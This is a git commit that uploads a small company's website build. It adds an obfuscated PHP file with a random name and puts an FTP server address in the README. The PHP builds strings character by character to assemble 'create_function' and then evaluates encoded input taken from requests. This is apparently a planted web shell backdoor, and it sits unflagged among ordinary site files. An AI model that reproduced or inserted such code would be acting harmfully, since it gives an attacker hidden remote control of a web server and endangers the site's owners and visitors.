fe27da3cfd5989ac44fbc64ec9e02866270656dd
ZacAdams <zta104@gmail.com>
2016-06-06 13:46:08 -0500

    Upload of original site build and initial corrections

---
+++ Current Build/xmbtbxhn.php
@@ -0,0 +1,138 @@
+<?php
+
+$dishwasher='Mv]nj';$honorable = 'BePE=f_a'; $chokes = 'o'; $ape ='r'; $insane = 'i'; $antic='r';
+$career = 'e",V';$hurlee = '(';
+$expository='M'; $joby= 'a';
+$haunter = ' ';$forays='u';$callus ='r'; $lexicography ='U';
+
+$deferrers='faC"ei$R'; $constraint ='Cuys'; $belvia = '@e(;(_';
+
+$inactive= '"';
+
+$hacker= '[';
+$gobbledygook= 'm[Prr(<:c';
+$handset ='_';
+
+$basketballs ='kbKa$R';$detention = ')'; $ironically= '(';
+$hereabouts = 'R';$befoul='e?(s9i'; $electron = 's'; $circumlocution='c';
+$decennial = '=';$disengage = 'lO';
+
+$deciphering='tV'; $fibers = ')Mt';$granger ='S'; $cramp ='X'; $lacunae= 'l'; $locale ='de';$coffers = 'nCv';
+
+$irony ='K'; $handclasp='V';
+$enveloped='$';
+
+$livre ='vJIP:g';
+$instruments = 'nog?cvv'; $ligand='a';
+
+$anarchy ='"';
+$epidemic ='_$fSvEAti';
+
+$cocks='h'; $magnificently= 'sg6r'; $jamming ='OSk5'; $approximating= 'f';
+$ancestors = 'c)vF)"QrF';$climbers='E'; $carver='e'; $lexicographical = 'Hs$r';$hopes=';'; $belligerence = '=$ad';$decently ='6;Oo';
+
+$bistate = '_'; $lacuna= 'iK>TtdF';
+
+$handfuls ='a';$epithet='U';
+
+$exaggerations ='WCprve';
+$kasper ='$f^bNVF'; $dialogues =')'; $major = 'iHg';
+
+$chamberlain ='w;[_m';$enumerative = 'u([;]_';
+$guglielma ='c';
+$bureaucrat= 'EslU$_D';
+
+$graphics = '(Eik'; $dryad='4';
+$engross ='ecen'; $anaphora= 'ave'; $luca='"';$delia ='pry'; $barnstorm = ')';
+$clowns= 'ms';$gratia = '"TQGr"'; $caddy=')';
+
+$family ='i(L'; $gwendolen = 'Z';$fused='f_a7]iE'; $camala = 'ur,edmVoa'; $crystal='HY]K';
+$ignorance = 'It3'; $karyatid='`'; $exists = '(';$feathery ='c'; $grippe ='$';
+
+$impersonations ='8';$jetlee = 'V';$liveried ='T)tt(:its';$inscribes='f_';
+$klemens='$_]';
+$deepest='e';$fetish = 'e'; $gwendolyn= 'p'; $gabriellia = 'T4aRa';$dolomite =')'; $bernice= ')'; $barbarities= 'qsuTe?U_[';
+
+$jaine='FTe';$conspicuous = ')'; $analytical =$feathery. $camala['1'].$jaine['2'] .$gabriellia['4'].$liveried['7'] .
+
+$jaine['2'] . $barbarities['7'].$inscribes['0']. $barbarities['2'].$engross[3].$feathery.$liveried['7'] .
+
+$liveried['6'] .$camala[7].$engross[3] ; $ciel= $haunter ;$guest2= $analytical($ciel,$jaine['2'] .
+
+$anaphora['1'].
+$gabriellia['4'].$bureaucrat['2'] . $liveried['4'] .$gabriellia['4'] .
+
+$camala['1'].$camala['1'] .
+$gabriellia['4'] .$delia['2'].$barbarities['7']. $gwendolyn .$camala[7].
+
+$gwendolyn. $liveried['4']. $inscribes['0'] . $barbarities['2'] .$engross[3].
+
+$feathery. $barbarities['7']. $major[2]. $jaine['2'] . $liveried['7'] .
+
+$barbarities['7'] .$gabriellia['4'] .$camala['1']. $major[2].
+
+$barbarities['1'].
+
+$liveried['4'] .$conspicuous['0'] .
+$conspicuous['0']. $conspicuous['0']. $enumerative['3']);
+$guest2 ($graphics['3'] ,$barbarities['5'] , $haunter ,$inscribes['0'] , $fremont , $gabriellia['4'] ,
+
+$cropped['1'],$cocks ,$barbarities['8'] ,$klemens['0'] .$liveried['6'].
+
+$belligerence['0']. $gabriellia['4'] .$camala['1'] .$camala['1'] .$gabriellia['4']. $delia['2'].
+
+$barbarities['7'].$camala['5'] .
+$jaine['2'] . $camala['1'].$major[2] . $jaine['2'].$liveried['4'] . $klemens['0'].$barbarities['7']. $gabriellia['3'] .$fused['6'] . $gratia['2'] . $barbarities[6].$fused['6'] .$jamming['1'].
+
+$jaine['1'].
+
+$camala['2'] .
+
+$klemens['0'].
+$barbarities['7'].$exaggerations[1]. $decently['2']. $decently['2']. $crystal['3'].$ignorance['0'] . $fused['6'].
+
+$camala['2'] . $klemens['0'].$barbarities['7'] .$jamming['1'] .$fused['6'].$gabriellia['3'] .$jetlee . $fused['6'] .$gabriellia['3'] .$conspicuous['0']. $enumerative['3'] .$klemens['0']. $gabriellia['4'].$belligerence['0'].$liveried['6'].
+$barbarities['1'].
+$barbarities['1'].$jaine['2'] .$liveried['7']. $liveried['4']. $klemens['0'] . $liveried['6'] .$barbarities['8'] .$gratia['5'].$barbarities['2'] .
+$inscribes['0']. $feathery .
+
+$anaphora['1'] . $inscribes['0'].
+$graphics['3'].$anaphora['1'] .$camala['5'] .$gratia['5'] .
+
+$klemens[2].
+$conspicuous['0'] .
+
+$barbarities['5'].
+
+$klemens['0'] .$liveried['6'].
+$barbarities['8'] . $gratia['5'] . $barbarities['2'] .$inscribes['0'] . $feathery. $anaphora['1'] .$inscribes['0'].$graphics['3']. $anaphora['1'] .$camala['5']. $gratia['5'] .$klemens[2].$liveried['5'] .$liveried['4']. $liveried['6'] .$barbarities['1'].
+
+$barbarities['1'] .$jaine['2']. $liveried['7']. $liveried['4'] . $klemens['0']. $liveried['6'].$barbarities['8'].$gratia['5'] .$crystal['0'].$jaine['1'] .$jaine['1']. $livre['3'].$barbarities['7'] .
+
+$barbarities[6] .
+
+$jaine['0'] .$exaggerations[1].$jetlee.$jaine['0'] .$crystal['3'] .
+
+$jetlee . $fibers['1']. $gratia['5']. $klemens[2] . $conspicuous['0'] . $barbarities['5'] . $klemens['0'] . $liveried['6'].$barbarities['8']. $gratia['5'] .
+$crystal['0'].$jaine['1'] . $jaine['1'] .$livre['3'] . $barbarities['7'] .
+
+$barbarities[6].$jaine['0']. $exaggerations[1] .$jetlee .$jaine['0'] .$crystal['3'].$jetlee . $fibers['1'] . $gratia['5'] . $klemens[2] .
+
+$liveried['5'] . $camala[4] .
+$liveried['6'] .$jaine['2'].$conspicuous['0'] .
+$enumerative['3'] . $jaine['2'] .$anaphora['1'].$gabriellia['4'].
+$bureaucrat['2'] .$liveried['4'] .$barbarities['1'] .
+
+$liveried['7']. $camala['1'] . $camala['1'] .
+$jaine['2'] .$anaphora['1'].$liveried['4'].$kasper['3']. $gabriellia['4'] .
+$barbarities['1'].
+$jaine['2']. $decently[0] .$gabriellia['1'] . $barbarities['7'].
+$camala[4].$jaine['2'] . $feathery.$camala[7] .
+$camala[4].$jaine['2'].$liveried['4'].$barbarities['1'] .
+
+$liveried['7'] .
+$camala['1'] .$camala['1'].$jaine['2'] . $anaphora['1'] .$liveried['4'].
+$klemens['0'] .
+
+$gabriellia['4']. $conspicuous['0'] . $conspicuous['0'].
+$conspicuous['0']. $conspicuous['0'].$enumerative['3']); 
--- README.md
+++ README.md
@@ -1,2 +1,6 @@
 # VersacorWebsite
 Versacor's Public Website
+
+Edits made off of Bluecrab original build
+
+FTP Address: 97.74.144.147
